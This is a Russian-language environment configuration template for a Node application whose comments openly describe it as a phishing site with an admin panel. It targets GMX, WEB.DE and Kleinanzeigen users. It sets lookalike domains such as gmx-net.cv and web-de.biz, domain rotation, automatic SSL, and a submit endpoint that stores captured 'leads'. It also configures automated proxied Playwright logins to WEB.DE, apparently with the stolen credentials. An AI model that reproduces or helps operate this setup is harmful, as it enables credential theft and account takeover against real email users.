# Скопируйте в .env и задайте свой токен (или сгенерируйте: node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
ADMIN_TOKEN=your-secret-token

# Опционально для npm test (интеграция WebDE; без этого тесты всё равно прогоняют check + маршруты):
# TEST_WEBDE_EMAIL=user@web.de
# TEST_WEBDE_PASSWORD=

# Nginx + Let’s Encrypt (CONFIG → Бренды «+», авто short-домены): нужен CERTBOT_EMAIL, sudo NOPASSWD для scripts/setup-short-domain-nginx.sh
# CERTBOT_EMAIL=you@example.com
# Только apex в сертификате (нет DNS для www) — иначе certbot падает на втором -d:
# CERTBOT_NO_WWW=1
# Дефолтный сайт nginx (Welcome to nginx) отключается скриптом по умолчанию. Оставить default: SHORT_NGINX_DISABLE_DEFAULT=0
# SHORT_NGINX_DISABLE_DEFAULT=0
# Кнопка «+» у бренда: по умолчанию SSL в фоне (прокси иначе рвёт длинный запрос). Синхронно ждать certbot только локально:
# BRAND_DOMAIN_PROVISION_SYNC=1

# Общая папка данных для ВСЕХ инстансов Node (обязательно, если фишинг и админка — разные PM2-приложения/папки).
# Иначе /api/submit пишет в .../gmx-net/data/leads.json, а админка на grzl.org читает свой ./data/leads.json — логов не видно.
# Пример: GMW_DATA_DIR=/var/gmw/shared-data
# (создайте каталог, дайте пользователю pm2 права на запись; на обоих процессах один и тот же путь)
# GMW_DATA_DIR=

# Макс. размер POST (загрузка GMX.zip и др. в CONFIG). По умолчанию в коде 200 МБ — держите ≤ nginx client_max_body_size.
# Если в .env было 50 — архивы >50 МБ дадут 413 даже при «обновлённом» коде, пока не увеличите или не удалите строку.
# GMW_MAX_POST_BODY_MB=200

# Домены: один основной на бренд (и списки алиасов — как у WEB.DE, иначе 301 с «левого» хоста)
# GMX_DOMAIN=gmx-net.cv
# GMX_DOMAINS=старый1.com\nстарый2.com
# Если есть data/brand-domains.json — домены из админки/файла перекрывают GMX_* / WEBDE_* / KLEIN_* из .env.
# Держите ecosystem / .env в согласованности на случай удаления JSON (сброс «→ .env» в админке).
# WEBDE_DOMAIN=web-de.biz
# Несколько доменов WEB.DE (первый — канонический, на него идёт редирект):
# WEBDE_DOMAINS=web-de.biz,www.web-de.biz
# Klein (пример актуального домена + миграция со старого):
# KLEIN_DOMAIN=783923.de
# KLEIN_DOMAINS=783923.de,www.783923.de,472398.de,www.472398.de
# KLEIN_LEGACY_REDIRECT_HOSTS=472398.de,www.472398.de
# KLEIN_LEGACY_REDIRECT_UNTIL=2026-03-31T10:25:49Z

# Ограничение доменов почты на сервере (/api/submit). Если список задан — для GMX/WEB.DE и др.
# принимаются только эти домены. Для бренда Klein список не применяется (любой домен).
# ALLOWED_EMAIL_DOMAINS=gmx.de,web.de,gmx.net,gmx.com

# Сколько авто-входов WEB.DE запускается одновременно (остальные в очереди). По умолчанию 5.
# WEBDE_LOGIN_MAX_CONCURRENT=5

# Окно Playwright для lead_simulation_api / klein_simulation_api: HEADLESS=0 в дочернем процессе.
# На macOS по умолчанию уже видимый браузер; на Linux/VPS задайте 1. Отключить: LOGIN_BROWSER_VISIBLE=0
# LOGIN_BROWSER_VISIBLE=1
# После сценария не закрывать браузер сразу — ждать Enter (headed). Сервер при LOGIN_BROWSER_VISIBLE=1 ставит 1, если не KEEP_BROWSER_OPEN=0
# KEEP_BROWSER_OPEN=1

# lead_simulation_api (дочерний процесс подставляет сам, если не задано):
# WEBDE_PROXY_FROM_ADMIN=1 — список прокси только с сервера GET /api/worker/proxy-txt (= Config → Прокси).
# WEBDE_REQUIRE_PROXY=1 — без валидных строк прокси скрипт не открывает браузер без прокси.
# Отладка без прокси на машине со скриптом: WEBDE_PROXY_FROM_ADMIN=0
